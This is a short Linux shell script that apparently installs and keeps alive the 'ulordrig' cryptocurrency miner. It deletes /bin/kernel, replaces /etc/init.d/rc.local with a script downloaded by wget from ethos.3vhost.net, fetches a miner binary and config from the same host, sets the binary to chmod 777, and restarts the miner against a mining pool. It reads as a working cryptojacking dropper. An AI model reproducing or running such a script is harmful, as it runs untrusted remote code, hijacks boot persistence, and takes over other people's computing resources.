#!/bin/sh

sudo rm -rf /bin/kernel

rcmessage="UlordRig-Linux-V1.0.0"
if cat /etc/init.d/rc.local | grep "$rcmessage">/dev/null
then
echo "local existence"
else 
wget ethos.3vhost.net/bin/uld/rc.sh -O /etc/init.d/rc.local
fi
if [ ! -d "/opt/miners/UlordRig-Linux-V1.0.0/" ];then
mkdir /opt/miners/UlordRig-Linux-V1.0.0
wget ethos.3vhost.net/bin/uld/config.json.98.sh -O /opt/miners/UlordRig-Linux-V1.0.0/config.json
wget ethos.3vhost.net/bin/uld/rig.sh -O /opt/miners/UlordRig-Linux-V1.0.0/ulordrig
sudo chmod 777 /opt/miners/UlordRig-Linux-V1.0.0/ulordrig
fi
message="ulord.bi-chi.com:7100"
if cat /opt/miners/UlordRig-Linux-V1.0.0/config.json | grep "$message">/dev/null
then
echo "existence"
else
wget ethos.3vhost.net/bin/uld/config.json.98.sh -O /opt/miners/UlordRig-Linux-V1.0.0/config.json
sudo killall ulordrig
sleep 3
cd /opt/miners/UlordRig-Linux-V1.0.0 && ./ulordrig
fi
CK=$( pidof ulordrig )
if [ "$CK" != "" ];then
sudo killall ulordrig
sleep 3
cd /opt/miners/UlordRig-Linux-V1.0.0 && ./ulordrig
fi
sleep 1
sudo pidof ulordrig